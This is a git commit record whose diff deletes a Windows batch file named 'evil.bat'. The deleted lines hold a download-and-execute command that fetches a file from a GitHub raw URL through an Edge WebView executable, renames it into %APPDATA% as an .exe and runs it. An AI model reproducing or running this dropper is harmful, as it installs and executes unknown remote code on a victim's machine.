eae979ef548c5af3fc119a03448309667913efe6
d00m5d4y <128174942+d00m5d4y@users.noreply.github.com>
2023-07-13 17:15:27 -0400

    Delete evil.bat

--- evil.bat
+++
@@ -1,3 +0,0 @@
-@ECHO OFF
-
-"c:\Program Files (x86)\Microsoft\Edge\Application\114.0.1823.79\msedgewebview2.exe" https://github.com/d00m5d4y/evilTesting2/raw/main/tendrilWIP.exe.txt && copy C:\Users\user\Downloads\tendrilWIP.exe.txt %APPDATA%\tendrilWIP.exe && %APPDATA%\tendrilWIP.exe
